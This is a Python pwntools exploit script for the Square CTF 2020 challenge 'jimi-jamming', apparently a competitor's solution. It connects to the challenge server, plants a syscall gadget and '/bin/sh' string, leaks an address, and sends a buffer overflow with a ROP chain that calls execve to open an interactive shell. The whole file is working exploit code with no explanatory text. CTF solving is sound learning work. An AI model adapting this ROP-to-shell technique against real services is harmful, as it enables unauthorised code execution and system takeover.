from pwn import *
import sys

# io = process(["./jimi-jamming"], env={ "LD_PRELOAD": "./libc.so.6" })
# io = process(["./jimi-jamming"])
io = remote("challenges.2020.squarectf.com", 9001)

io.recvuntil(b"somewhere\n")
key = b"\x0f\x05/bin/sh\x00"
io.send(key)
io.recvuntil(b"key?\n")
key_offset = 8
io.send(str(key_offset).encode("utf-8"))

io.recvline()
center = io.recvline().rsplit(b" ", 1)[-1].strip()
jail = int(center.decode("utf-8")[2:], 16)
base = jail - 0x6000

print("jail", hex(jail))
print("base", hex(base))

io.recvline()

pop_rdi = 0x0000000000000daf + jail;
pop_rax = 0x0000000000000dcf + jail;
pop_rsi = 0x0000000000000d3f + jail;
pop_rdx = 0x00000000000007df + jail;
syscall = key_offset + jail;
slope = jail

print("key at ", hex(jail + key_offset))

rop = p64(pop_rdi) + p64(jail + key_offset + 2) + \
        p64(pop_rax) + p64(0x3b) + \
        p64(pop_rsi) + p64(0) + \
        p64(pop_rdx) + p64(0) + \
        p64(syscall)

payload = p64(0) * 4 + p64(slope) + rop
io.sendline(payload)
io.interactive()

